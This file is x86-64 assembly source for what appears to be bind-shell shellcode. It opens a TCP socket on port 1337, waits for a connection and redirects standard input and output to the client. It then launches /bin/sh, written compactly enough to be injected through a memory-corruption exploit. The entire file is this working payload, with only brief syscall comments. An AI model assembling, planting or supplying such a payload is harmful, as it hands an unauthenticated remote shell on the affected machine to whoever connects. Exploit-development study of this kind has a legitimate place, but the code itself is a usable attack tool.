bits 64
section .text
global _start

_start:
	
	; socket(AF_INET, SOCK_STREAM, 0)
	; (2, 1, 0)

	xor rax, rax
	mov rdx, rax
	mov al, 41
	mov rsi, rdx
	inc rsi
	mov rdi, rsi
	inc rdi

	syscall

	mov r8, rax

	; bind(sockfd, &saddr, 0x10)
	
	mov rdi, r8
	mov al, 49
	push rdx
	push rdx
	mov byte [rsp], 0x2
	mov word [rsp+2], 0x3905
	mov rsi, rsp
	mov dl, 0x10

	syscall

	; listen(sockfd, 0x10)

	mov al, 50
	mov rsi, rdx

	syscall

	; accept(sockfd, NULL, NULL)
	
	mov al, 43
	xor rsi, rsi
	xor rdx, rdx

	syscall

	mov r9, rax

	; dup2(clientfd, [0,1,2])

	mov rdi, r9
	duplicate:
		mov al, 33
		syscall
		inc sil
		cmp sil, 0x2
		jle duplicate

	; execve("/bin/sh", NULL, NULL)
	
	jmp binsh

	shell:
	mov al, 0x3b
	xor rsi, rsi
	xor rdx, rdx
	pop rdi

	syscall

	binsh:
		call shell
		db "/bin/sh"